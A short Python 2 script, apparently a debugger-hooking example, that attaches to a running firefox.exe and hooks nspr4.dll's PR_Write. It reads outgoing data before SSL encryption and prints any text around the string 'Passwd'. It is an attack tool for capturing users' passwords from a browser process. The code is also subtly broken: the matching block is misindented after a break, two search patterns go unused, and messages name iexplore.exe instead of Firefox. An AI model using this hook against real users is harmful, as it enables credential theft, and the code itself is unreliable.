from pydbg import *
from pydbg.defines import *

import utils, re
import sys

dbg = pydbg()
found_ie = False

pattern1 = "Passwd"
pattern2 = "name"
pattern3 = "haha"

def ssl_sniff(dbg, args):
	buf = ""
	offset = 0
	while 1:
		byte = dbg.read_process_memory(args[1] + offset, 1)

		if byte != "\x00":
			buf += byte
			offset += 1
			continue
		else:
			break


        if pattern1 in buf:
				index = buf.index(pattern1)
                print "Pre-Encrypted: %s" % buf[index-30:index+30]

	return DBG_CONTINUE

for (pid, name) in dbg.enumerate_processes():
	if name.lower() == "firefox.exe":
		found_ie = True
		hooks = utils.hook_container()

		dbg.attach(pid)
		print "[*] Attaching to firefox.exe with PID: %d" % pid

		hook_address = dbg.func_resolve_debuggee("nspr4.dll", "PR_Write")

		if hook_address:
			hooks.add(dbg, hook_address, 2, ssl_sniff, None)
			print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address


		else:
			print "[*] Error: Couldn't resolve hook address"
			sys.exit(-1)

if found_ie:
	print "[*] Hooks set, continuing process."
	dbg.run()
else:
	print "[*] Error: Couldn't find the iexplore.exe process."
	sys.exit(-1)
